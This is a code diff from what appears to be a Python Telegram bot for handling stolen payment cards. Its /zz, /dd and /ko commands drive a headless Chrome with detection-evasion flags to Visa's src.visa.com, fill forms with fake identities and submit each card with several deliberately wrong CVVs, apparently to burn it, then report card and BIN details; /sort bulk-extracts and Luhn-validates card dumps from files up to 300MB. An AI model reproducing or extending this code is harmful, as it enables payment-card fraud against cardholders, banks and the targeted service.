         tries_txt = "\n".join([f"• Try {i+1}: {cvv}" for i, cvv in enumerate(cvv_results)])
-        edit_message(
+        killer_edit_message(update_dict,
             f"💳 **Card:** `{short_card}`\n"
             f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
             f"🔁 **CVV Attempts:**\n{tries_txt}\n\n"
@@ -3885,15 +3787,11 @@ def run_ko_process(card_input, update_dict):
 
     except Exception as e:
         trace = traceback.format_exc()
-        edit_message(f"❌ KO Error: `{e}`")
-        admin_report(trace, driver)
+        killer_edit_message(update_dict, f"❌ KO Error: `{e}`")
+        killer_admin_report("ko", trace, driver)
         record_cmd_failure("ko")
     finally:
-        try:
-            if driver: driver.quit()
-        except: pass
-        driver = None
-        gc.collect()
+        killer_cleanup_driver(driver)
 
 async def ko_cmd(update, context):
     uid = update.effective_user.id
@@ -3921,171 +3819,21 @@ async def ko_cmd(update, context):
 
 # ==== 7.5 /zz Command (Killed v5 — fast KO, 6 total CVV attempts) ==== #
 def run_zz_process(card_input, update_dict):
-    import os, random, traceback, requests, time
-    from selenium import webdriver
-    from selenium.webdriver.chrome.service import Service
+    """Killed v5 Fast - OPTIMIZED for consistent speed"""
+    import random, traceback, time, gc
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
     from selenium.webdriver.support import expected_conditions as EC
     from selenium.webdriver.common.keys import Keys
-    from fake_useragent import UserAgent
-
-    CHROME_PATH = "/usr/bin/google-chrome"
-    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
-    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-
-    def _env_int(name: str, default: int) -> int:
-        raw = os.environ.get(name)
-        if raw is None or str(raw).strip() == "":
-            return default
-        try:
-            return int(str(raw).strip())
-        except Exception:
-            return default
-
-    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
-
-    def _flag_from_country_code(code: str) -> str:
-        code = (code or "").strip().upper()
-        if len(code) != 2 or not code.isalpha():
-            return ""
-        try:
-            return "".join(chr(ord(c) + 127397) for c in code)
-        except Exception:
-            return ""
-
-    def split_card(card_input):
-        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
-        if len(parts) != 4:
-            raise ValueError("Invalid card format")
-        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
-
-    def get_bin_info_local(bin_number):
-        try:
-            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=4)
-            if res.status_code == 200:
-                data = res.json()
-                brand = data.get("brand", "Unknown").upper()
-                type_ = data.get("type", "Unknown").upper()
-                country = data.get("country_name", "Unknown")
-                country_code = data.get("country", "") or data.get("country_code", "")
-                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
-                bank = data.get("bank", "Unknown")
-                level = data.get("level", "")
-
-                info_parts = [brand]
-                if type_ and type_ != "UNKNOWN":
-                    info_parts.append(type_)
-                if country and country != "Unknown":
-                    info_parts.append(country)
-                if level and level != "":
-                    info_parts.append(level)
-                if bank and bank != "Unknown":
-                    info_parts.append(bank)
-
-                return " • ".join(info_parts), country_flag
-        except Exception:
-            pass
-        return "Unavailable", ""
-
-    def get_random_email():
-        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
-
-    def get_fake_name():
-        first = random.choice(["James", "John", "Robert", "Michael", "David"])
-        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
-        return first, last
-
-    def get_fake_address():
-        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))
-
-    def get_wrong_cvv(exclude):
-        while True:
-            fake = ''.join(random.choices('0123456789', k=3))
-            if fake != exclude:
-                return fake
-
-    def edit_message(text):
-        payload = {
-            "chat_id": update_dict["chat_id"],
-            "message_id": update_dict["message_id"],
-            "text": text,
-            "parse_mode": "Markdown"
-        }
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
-        try:
-            requests.post(url, data=payload, timeout=8)
-        except Exception:
-            pass
-
-    def admin_report(trace, driver=None):
-        sent = False
-        screenshot_path = "zz_fail.png"
-        if driver:
-            try:
-                driver.save_screenshot(screenshot_path)
-                with open(screenshot_path, "rb") as img:
-                    files = {"photo": img}
-                    payload = {
-                        "chat_id": BOT_ADMIN_ID,
-                        "caption": f"ZZ Error:\n```\n{trace[:900]}\n```",
-                        "parse_mode": "Markdown"
-                    }
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                        data=payload,
-                        files=files,
-                        timeout=12
-                    )
-                sent = True
-                os.remove(screenshot_path)
-            except Exception:
-                pass
-        if not sent:
-            try:
-                payload = {
-                    "chat_id": BOT_ADMIN_ID,
-                    "text": f"ZZ Error (no screenshot):\n```\n{trace[:900]}\n```",
-                    "parse_mode": "Markdown"
-                }
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    data=payload,
-                    timeout=8
-                )
-            except Exception:
-                pass
 
     start = time.time()
     driver = None
 
     try:
-        edit_message("⚙️ Processing your request...")
+        killer_edit_message(update_dict, "⚙️ Processing your request...")
 
-        # Optimized Chrome options for Railway
-        options = webdriver.ChromeOptions()
-        options.binary_location = CHROME_PATH
-        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
-        options.add_argument(f"user-agent={ua}")
-        options.add_argument("--headless=new")
-        options.add_argument("--no-sandbox")
-        options.add_argument("--disable-dev-shm-usage")
-        options.add_argument("--disable-gpu")
-        options.add_argument("--disable-extensions")
-        options.add_argument("--disable-software-rasterizer")
-        options.add_argument("--disable-background-networking")
-        options.add_argument("--disable-default-apps")
-        options.add_argument("--disable-sync")
-        options.add_argument("--no-first-run")
-        options.add_argument("--window-size=1920,1080")
-        options.add_argument("--disable-blink-features=AutomationControlled")
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
-        options.set_capability("pageLoadStrategy", "eager")
-
-        service = Service(executable_path=CHROME_DRIVER_PATH)
-        driver = webdriver.Chrome(service=service, options=options)
-        driver.set_page_load_timeout(20)
+        # Use shared optimized driver
+        driver = create_killer_driver()
         wait = WebDriverWait(driver, 3)
 
         driver.get("https://src.visa.com/login")
@@ -4093,64 +3841,58 @@ def run_zz_process(card_input, update_dict):
         try:
             btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
             driver.execute_script("arguments[0].click();", btn)
-        except Exception:
+        except:
             pass
 
-        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
+        identity = killer_get_fake_identity()
+        
+        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()
 
-        cc, mm, yy, real_cvv = split_card(card_input)
-        bin_info, bin_flag = get_bin_info_local(cc[:6])
+        cc, mm, yy, real_cvv = killer_split_card(card_input)
+        bin_info, bin_flag = get_cached_bin_info(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
 
-        wrong_cvv = get_wrong_cvv(real_cvv)
+        wrong_cvv = killer_get_wrong_cvv(real_cvv)
         wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
         wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
         wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
 
-        # Billing (USA)
-        first_name, last_name = get_fake_name()
-        address, city, state, zip_code, phone = get_fake_address()
-        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
-        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)
+        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
+        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])
 
         try:
-            country_box = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
-            )
-            country_val = country_box.get_attribute('value')
-            if not country_val or ("United States" not in country_val):
+            country_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
+            country_val = country_box.get_attribute('value') or ""
+            if "United States" not in country_val:
                 country_box.click()
                 country_box.clear()
                 country_box.send_keys("United States")
-                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
                 country_box.send_keys(Keys.ENTER)
-        except Exception:
+        except:
             pass
 
-        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
-        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
-        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
-        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
-        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)
+        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
+        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
+        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
+        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
+        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(identity["phone"])
 
         add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
         driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
         add_card_btn.click()
 
-        edit_message("🔄 Updating your request...")
+        killer_edit_message(update_dict, "🔄 Updating your request...")
 
-        # Total CVV attempts = 6 (including the initial submit above)
-        TOTAL_TRIES = 6
+        # CVV attempts (6 total)
         used_cvvs = {wrong_cvv}
-        for _ in range(TOTAL_TRIES - 1):
-            while True:
-                fake_cvv = ''.join(random.choices('0123456789', k=3))
-                if fake_cvv not in used_cvvs:
-                    used_cvvs.add(fake_cvv)
-                    break
+        for _ in range(5):
+            fake_cvv = killer_get_wrong_cvv(real_cvv)
+            while fake_cvv in used_cvvs:
+                fake_cvv = killer_get_wrong_cvv(real_cvv)
+            used_cvvs.add(fake_cvv)
             try:
                 add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
                 cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
@@ -4159,12 +3901,11 @@ def run_zz_process(card_input, update_dict):
                 cvv_field.send_keys(fake_cvv)
                 driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
                 add_card_btn.click()
-            except Exception:
-                # Keep going; /zz is meant to be fast & best-effort
+            except:
                 pass
 
         duration = round(time.time() - start, 2)
-        edit_message(
+        killer_edit_message(update_dict,
             f"💳 **Card:** `{short_card}`\n"
             f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
             f"1 Procceed\n"
@@ -4176,17 +3917,11 @@ def run_zz_process(card_input, update_dict):
 
     except Exception as e:
         trace = traceback.format_exc()
-        edit_message(f"❌ ZZ Error: `{e}`")
-        admin_report(trace, driver)
+        killer_edit_message(update_dict, f"❌ ZZ Error: `{e}`")
+        killer_admin_report("zz", trace, driver)
         record_cmd_failure("zz")
     finally:
-        try:
-            if driver:
-                driver.quit()
-        except Exception:
-            pass
-        driver = None
-        gc.collect()
+        killer_cleanup_driver(driver)
 
 
 async def zz_cmd(update, context):
@@ -4215,237 +3950,87 @@ async def zz_cmd(update, context):
 
 # ==== 7.6 /dd Command (Killed v6 — ultra-fast, 3 CVV attempts only) ==== #
 def run_dd_process(card_input, update_dict):
-    import os, random, traceback, requests, time
-    from selenium import webdriver
-    from selenium.webdriver.chrome.service import Service
+    """Killed v6 Ultra-Fast - OPTIMIZED for consistent speed"""
+    import random, traceback, time, gc
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
     from selenium.webdriver.support import expected_conditions as EC
     from selenium.webdriver.common.keys import Keys
-    from fake_useragent import UserAgent
-
-    CHROME_PATH = "/usr/bin/google-chrome"
-    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
-    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-
-    def _env_int(name: str, default: int) -> int:
-        raw = os.environ.get(name)
-        if raw is None or str(raw).strip() == "":
-            return default
-        try:
-            return int(str(raw).strip())
-        except Exception:
-            return default
-
-    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
-
-    def _flag_from_country_code(code: str) -> str:
-        code = (code or "").strip().upper()
-        if len(code) != 2 or not code.isalpha():
-            return ""
-        try:
-            return "".join(chr(ord(c) + 127397) for c in code)
-        except Exception:
-            return ""
-
-    def split_card(card_input):
-        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
-        if len(parts) != 4:
-            raise ValueError("Invalid card format")
-        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
-
-    def get_bin_info_local(bin_number):
-        try:
-            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=3)
-            if res.status_code == 200:
-                data = res.json()
-                brand = data.get("brand", "Unknown").upper()
-                type_ = data.get("type", "Unknown").upper()
-                country = data.get("country_name", "Unknown")
-                country_code = data.get("country", "") or data.get("country_code", "")
-                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
-                bank = data.get("bank", "Unknown")
-                level = data.get("level", "")
-
-                info_parts = [brand]
-                if type_ and type_ != "UNKNOWN":
-                    info_parts.append(type_)
-                if country and country != "Unknown":
-                    info_parts.append(country)
-                if level and level != "":
-                    info_parts.append(level)
-                if bank and bank != "Unknown":
-                    info_parts.append(bank)
-
-                return " • ".join(info_parts), country_flag
-        except Exception:
-            pass
-        return "Unavailable", ""
-
-    def get_random_email():
-        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
-
-    def get_fake_name():
-        first = random.choice(["James", "John", "Robert", "Michael", "David"])
-        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
-        return first, last
-
-    def get_fake_address():
-        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))
-
-    def get_wrong_cvv(exclude):
-        while True:
-            fake = ''.join(random.choices('0123456789', k=3))
-            if fake != exclude:
-                return fake
-
-    def edit_message(text):
-        payload = {
-            "chat_id": update_dict["chat_id"],
-            "message_id": update_dict["message_id"],
-            "text": text,
-            "parse_mode": "Markdown"
-        }
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
-        try:
-            requests.post(url, data=payload, timeout=5)
-        except Exception:
-            pass
-
-    def admin_report(trace, driver=None):
-        sent = False
-        screenshot_path = "dd_fail.png"
-        if driver:
-            try:
-                driver.save_screenshot(screenshot_path)
-                with open(screenshot_path, "rb") as img:
-                    files = {"photo": img}
-                    payload = {
-                        "chat_id": BOT_ADMIN_ID,
-                        "caption": f"DD Error:\n```\n{trace[:900]}\n```",
-                        "parse_mode": "Markdown"
-                    }
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                        data=payload,
-                        files=files,
-                        timeout=10
-                    )
-                sent = True
-                os.remove(screenshot_path)
-            except Exception:
-                pass
-        if not sent:
-            try:
-                payload = {
-                    "chat_id": BOT_ADMIN_ID,
-                    "text": f"DD Error (no screenshot):\n```\n{trace[:900]}\n```",
-                    "parse_mode": "Markdown"
-                }
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    data=payload,
-                    timeout=5
-                )
-            except Exception:
-                pass
 
     start = time.time()
     driver = None
 
     try:
-        edit_message("⚡ Processing (ultra-fast)...")
+        killer_edit_message(update_dict, "⚡ Processing (ultra-fast)...")
 
-        # Optimized Chrome options for Railway
-        options = webdriver.ChromeOptions()
-        options.binary_location = CHROME_PATH
-        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
-        options.add_argument(f"user-agent={ua}")
-        options.add_argument("--headless=new")
-        options.add_argument("--no-sandbox")
-        options.add_argument("--disable-dev-shm-usage")
-        options.add_argument("--disable-gpu")
-        options.add_argument("--disable-extensions")
-        options.add_argument("--disable-software-rasterizer")
-        options.add_argument("--disable-background-networking")
-        options.add_argument("--disable-default-apps")
-        options.add_argument("--disable-sync")
-        options.add_argument("--disable-translate")
-        options.add_argument("--no-first-run")
-        options.add_argument("--window-size=1920,1080")
-        options.add_argument("--disable-blink-features=AutomationControlled")
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
-        options.set_capability("pageLoadStrategy", "eager")
-
-        service = Service(executable_path=CHROME_DRIVER_PATH)
-        driver = webdriver.Chrome(service=service, options=options)
-        driver.set_page_load_timeout(20)
+        # Use shared optimized driver
+        driver = create_killer_driver()
         wait = WebDriverWait(driver, 2)
 
         driver.get("https://src.visa.com/login")
 
+        # Accept cookies if present
         try:
             btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
             driver.execute_script("arguments[0].click();", btn)
-        except Exception:
+        except:
             pass
 
-        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
+        # Get identity
+        identity = killer_get_fake_identity()
+        
+        # Login
+        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()
 
-        cc, mm, yy, real_cvv = split_card(card_input)
-        bin_info, bin_flag = get_bin_info_local(cc[:6])
+        # Parse card
+        cc, mm, yy, real_cvv = killer_split_card(card_input)
+        bin_info, bin_flag = get_cached_bin_info(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
 
-        wrong_cvv = get_wrong_cvv(real_cvv)
+        # Fill card with wrong CVV
+        wrong_cvv = killer_get_wrong_cvv(real_cvv)
         wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
         wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
         wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
 
-        # Billing (USA)
-        first_name, last_name = get_fake_name()
-        address, city, state, zip_code, phone = get_fake_address()
-        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
-        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)
+        # Billing
+        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
+        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])
 
         try:
-            country_box = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
-            )
-            country_val = country_box.get_attribute('value')
-            if not country_val or ("United States" not in country_val):
+            country_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
+            country_val = country_box.get_attribute('value') or ""
+            if "United States" not in country_val:
                 country_box.click()
                 country_box.clear()
                 country_box.send_keys("United States")
-                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
                 country_box.send_keys(Keys.ENTER)
-        except Exception:
+        except:
             pass
 
-        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
-        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
-        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
-        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
-        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)
+        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
+        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
+        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
+        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
+        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(identity["phone"])
 
+        # Submit
         add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
         driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
         add_card_btn.click()
 
-        edit_message("⚡ Updating (ultra-fast)...")
+        killer_edit_message(update_dict, "⚡ Updating (ultra-fast)...")
 
-        # Total CVV attempts = 6 (same as /zz)
-        TOTAL_TRIES = 6
+        # CVV attempts (6 total)
         used_cvvs = {wrong_cvv}
-        for _ in range(TOTAL_TRIES - 1):
-            while True:
-                fake_cvv = ''.join(random.choices('0123456789', k=3))
-                if fake_cvv not in used_cvvs:
-                    used_cvvs.add(fake_cvv)
-                    break
+        for _ in range(5):
+            fake_cvv = killer_get_wrong_cvv(real_cvv)
+            while fake_cvv in used_cvvs:
+                fake_cvv = killer_get_wrong_cvv(real_cvv)
+            used_cvvs.add(fake_cvv)
             try:
                 add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
                 cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
@@ -4454,12 +4039,11 @@ def run_dd_process(card_input, update_dict):
                 cvv_field.send_keys(fake_cvv)
                 driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
                 add_card_btn.click()
-            except Exception:
-                # Keep going; /dd is meant to be ultra-fast & best-effort
+            except:
                 pass
 
         duration = round(time.time() - start, 2)
-        edit_message(
+        killer_edit_message(update_dict,
             f"💳 **Card:** `{short_card}`\n"
             f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
             f"1 Procceed\n"
@@ -4471,18 +4055,11 @@ def run_dd_process(card_input, update_dict):
 
     except Exception as e:
         trace = traceback.format_exc()
-        edit_message(f"❌ DD Error: `{e}`")
-        admin_report(trace, driver)
+        killer_edit_message(update_dict, f"❌ DD Error: `{e}`")
+        killer_admin_report("dd", trace, driver)
         record_cmd_failure("dd")
     finally:
-        try:
-            if driver:
-                driver.quit()
-        except Exception:
-            pass
-        # Help garbage collector
-        driver = None
-        gc.collect()
+        killer_cleanup_driver(driver)
 
 
 async def dd_cmd(update, context):
@@ -5366,115 +4943,102 @@ async def chk_cmd(update, context):
 # ==== 12. /sort COMMAND (Fixed Card Sorting & Cleaning) ====
 def extract_and_clean_cards_sort(data_text):
     """
-    Extract and clean cards for /sort command.
+    Extract and clean cards for /sort command - OPTIMIZED for 200MB+ files.
     Returns tuple: (valid_cards, duplicates_count, expired_count, junk_count, total_raw)
     """
-    start_time = time.time()
-    
     if not data_text or not isinstance(data_text, str):
         return [], 0, 0, 0, 0
     
-    # Split by lines and process each line separately
-    lines = data_text.split('\n')
     valid_cards = []
-    seen_cards = set()
-    duplicates = 0
-    expired = 0
-    junk = 0
-    total_raw = 0
+    seen = set()
+    stats = {'dup': 0, 'exp': 0, 'junk': 0, 'raw': 0}
     
-    for line in lines:
-        # Skip empty lines
-        if not line.strip():
-            continue
-            
-        # Clean the line - replace multiple spaces with single space
-        line = re.sub(r'\s+', ' ', line.strip())
+    # Single comprehensive pattern
+    pattern = re.compile(r'(\d{13,19})[|\s/\\:;,._-]+(\d{1,2})[|\s/\\:;,._-]+(\d{2,4})[|\s/\\:;,._-]+(\d{3,4})')
+    
+    # Current time for expiry check
+    now_year = datetime.now().year
+    now_month = datetime.now().month
+    
+    # Process in chunks for memory efficiency
+    chunk_size = 1024 * 1024  # 1MB
+    pos = 0
+    text_len = len(data_text)
+    
+    while pos < text_len:
+        end = min(pos + chunk_size, text_len)
+        if end < text_len:
+            newline_pos = data_text.find('\n', end)
+            if newline_pos != -1 and newline_pos < end + 500:
+                end = newline_pos + 1
         
-        # FIXED: Improved regex patterns for card extraction
-        patterns = [
-            r'(\d{12,19})\s*[|/\\]\s*(\d{1,2})\s*[|/\\]\s*(\d{2,4})\s*[|/\\]\s*(\d{3,4})',
-            r'(\d{12,19})\s+(\d{1,2})[/-](\d{2,4})\s+(\d{3,4})',
-            r'(\d{12,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
-            r'(\d{12,19}).*?(\d{1,2})[/-](\d{2,4}).*?(\d{3,4})',
-        ]
+        chunk = data_text[pos:end]
+        pos = end
         
-        matches = []
-        for pattern in patterns:
-            matches = re.findall(pattern, line, re.IGNORECASE)
-            if matches:
-                break
-        
-        total_raw += len(matches)
-        
-        for match in matches:
-            card, mm, yy, cvv = match
+        for match in pattern.finditer(chunk):
+            stats['raw'] += 1
+            cc, mm, yy, cvv = match.groups()
             
-            # Clean and validate
-            card = card.strip()
-            mm = mm.strip().zfill(2)
-            yy = yy.strip()
-            cvv = cvv.strip()
-            
-            # Validate lengths
-            if not (12 <= len(card) <= 19):
-                junk += 1
-                continue
-                
-            if not (1 <= len(mm) <= 2 and mm.isdigit() and 1 <= int(mm) <= 12):
-                junk += 1
-                continue
-                
-            if not (2 <= len(yy) <= 4 and yy.isdigit()):
-                junk += 1
-                continue
-                
-            if not (3 <= len(cvv) <= 4 and cvv.isdigit()):
-                junk += 1
-                continue
-            
-            # Handle year format
+            # Normalize
+            mm = mm.zfill(2)
             if len(yy) == 4:
                 yy = yy[-2:]
+            else:
+                yy = yy.zfill(2)
             
-            # Skip if year is obviously wrong
-            if int(yy) > 40 and int(yy) < 100:
-                # Try to find a better year in the line
-                year_search = re.search(r'20(\d{2})', line)
-                if year_search:
-                    yy = year_search.group(1)
-                else:
-                    junk += 1
+            # Quick validations
+            try:
+                if not (1 <= int(mm) <= 12):
+                    stats['junk'] += 1
                     continue
-            
-            # Luhn check
-            if not luhn_check(card):
-                junk += 1
+            except:
+                stats['junk'] += 1
                 continue
             
-            # Check expiration
-            if is_card_expired(mm, yy):
-                expired += 1
+            if len(cvv) < 3:
+                stats['junk'] += 1
                 continue
             
-            # Format card
-            formatted = f"{card}|{mm}|{yy}|{cvv}"
-            
-            # Check for duplicates
-            if formatted in seen_cards:
-                duplicates += 1
+            # Inline Luhn check
+            try:
+                total = 0
+                for i, c in enumerate(reversed(cc)):
+                    d = int(c)
+                    if i % 2 == 1:
+                        d *= 2
+                        if d > 9:
+                            d -= 9
+                    total += d
+                if total % 10 != 0:
+                    stats['junk'] += 1
+                    continue
+            except:
+                stats['junk'] += 1
                 continue
-                
-            seen_cards.add(formatted)
+            
+            # Expiry check
+            try:
+                year = 2000 + int(yy)
+                month = int(mm)
+                if year < now_year or (year == now_year and month < now_month):
+                    stats['exp'] += 1
+                    continue
+            except:
+                stats['junk'] += 1
+                continue
+            
+            # Format and dedupe
+            formatted = f"{cc}|{mm}|{yy}|{cvv}"
+            if formatted in seen:
+                stats['dup'] += 1
+                continue
+            seen.add(formatted)
             valid_cards.append(formatted)
     
-    # Sort cards by BIN (first 6 digits)
+    # Sort by BIN
     valid_cards.sort(key=lambda x: x[:6])
     
-    processing_time = time.time() - start_time
-    print(f"Sort processing took {processing_time:.2f} seconds, found {len(valid_cards)} valid cards from {total_raw} raw matches")
-    
-    return valid_cards, duplicates, expired, junk, total_raw
+    return valid_cards, stats['dup'], stats['exp'], stats['junk'], stats['raw']
 
 async def sort_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -5497,8 +5061,8 @@ async def sort_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Check for document attachment
         if replied_msg.document:
             file_size = replied_msg.document.file_size
-            if file_size > 10 * 1024 * 1024:  # 10MB limit
-                await update.message.reply_text("⚠️ File too large. Maximum size is 10MB.", reply_to_message_id=update.message.message_id)
+            if file_size > 300 * 1024 * 1024:  # 300MB limit
+                await update.message.reply_text("⚠️ File too large. Maximum size is 300MB.", reply_to_message_id=update.message.message_id)
                 return
             
             # Download file
